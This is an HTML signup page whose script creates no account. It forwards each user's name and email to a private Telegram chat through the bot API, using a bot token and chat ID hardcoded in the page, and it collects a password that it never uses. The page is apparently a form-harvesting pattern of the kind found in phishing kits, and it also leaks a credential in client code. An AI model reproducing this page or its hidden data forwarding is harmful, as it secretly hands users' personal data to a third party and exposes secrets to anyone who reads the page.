<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signup Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
        }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px -10px;
            border-radius: 4px;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .link {
            display: block;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Signup</h2>
    <form id="signupForm" onsubmit="handleSignup(event)">
        <input type="text" id="firstName" placeholder="First Name" required>
        <input type="text" id="lastName" placeholder="Last Name" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password (min 5 characters)" required>
        <input type="submit" value="Signup">
    </form>
    <a href="login.html" class="link">Already have an account?</a>
</div>

<script>
    const telegramBotToken = '7336794177:AAHPn71flj8h0pZPchBibt6-yy31nJ4WbdE'; // Telegram bot token
    const chatId = '5944418337'; // Your chat ID

    async function handleSignup(event) {
        event.preventDefault(); // Prevent form submission
        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (password.length < 5) {
            alert("Password must be at least 5 characters long.");
            return;
        }

        // Send data to Telegram regardless of any other functionality
        sendToTelegram(`New Signup:\nName: ${firstName} ${lastName}\nEmail: ${email}`);
        alert("Signup information sent!");
    }

    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    }
</script>

</body>
</html>
